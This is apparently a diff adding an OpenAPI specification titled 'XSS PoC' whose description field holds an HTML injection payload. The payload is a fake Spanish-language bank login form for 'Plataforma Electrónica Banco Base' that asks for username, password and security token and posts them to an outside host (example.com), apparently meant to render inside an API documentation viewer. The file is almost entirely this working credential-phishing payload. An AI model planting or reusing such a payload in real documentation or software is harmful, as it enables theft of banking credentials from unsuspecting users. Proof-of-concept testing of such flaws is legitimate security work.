@@ -1,0 +1,34 @@
+openapi: "3.0.0"
+info:
+  version: 3.0.0
+  title: XSS PoC
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>Plataforma Electrónica Banco Base</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Usuario</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Token</label>
+                <input type="password" name="token" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Continuar</button>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
